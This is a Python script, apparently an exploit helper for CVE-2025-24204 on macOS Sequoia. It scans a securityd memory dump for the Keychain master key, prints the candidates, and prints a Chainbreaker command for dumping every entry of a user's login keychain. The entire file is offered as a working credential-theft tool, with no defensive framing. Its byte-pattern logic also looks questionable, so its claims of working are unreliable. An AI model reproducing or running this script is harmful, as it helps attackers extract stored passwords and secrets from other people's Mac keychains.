#!/usr/bin/env python3
"""
Extract Keychain master key from securityd memory dump (CVE-2025-24204)
Usage: python3 extract_keychain_master_key.py <securityd_core_file>

This script searches for the Keychain master key pattern in a memory dump.
Works on macOS 15.0-15.2 (Sequoia) with the gcore entitlement vulnerability.
"""

import sys
import re
import mmap

def find_master_key(core_file):
    """Search for Keychain master key in memory dump"""
    try:
        with open(core_file, 'rb') as f:
            mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
            
            # Pattern: 8 null bytes + 0x18 + 96 bytes of key data
            # The key should contain SALTED-SHA512-PBKDF2 marker
            pattern = re.compile(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}')
            
            found_keys = []
            for match in pattern.finditer(mm):
                candidate = match.group(0)
                if b'SALTED-SHA512-PBKDF2' in candidate:
                    key_hex = candidate.hex()
                    found_keys.append(key_hex)
                    print(f"Found potential master key:")
                    print(f"  Hex: {key_hex}")
                    print(f"  Offset: {match.start()}")
                    print()
            
            if not found_keys:
                print("No master key found in memory dump.", file=sys.stderr)
                return None
            
            return found_keys
            
    except FileNotFoundError:
        print(f"Error: File not found: {core_file}", file=sys.stderr)
        return None
    except PermissionError:
        print(f"Error: Permission denied reading: {core_file}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"Error processing memory dump: {e}", file=sys.stderr)
        return None

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 extract_keychain_master_key.py <securityd_core_file>", file=sys.stderr)
        print("Example: python3 extract_keychain_master_key.py /tmp/securityd.12345", file=sys.stderr)
        sys.exit(1)
    
    core_file = sys.argv[1]
    
    print(f"Searching for Keychain master key in: {core_file}")
    print("=" * 60)
    print()
    
    keys = find_master_key(core_file)
    
    if keys:
        print(f"\nFound {len(keys)} potential master key(s)")
        print("\nTo use with Chainbreaker:")
        print(f"  python3 chainbreaker.py --dump-all --key {keys[0]} /Users/<username>/Library/Keychains/login.keychain-db")
    else:
        print("\nNo master keys found. The system may be patched or the dump may be incomplete.", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
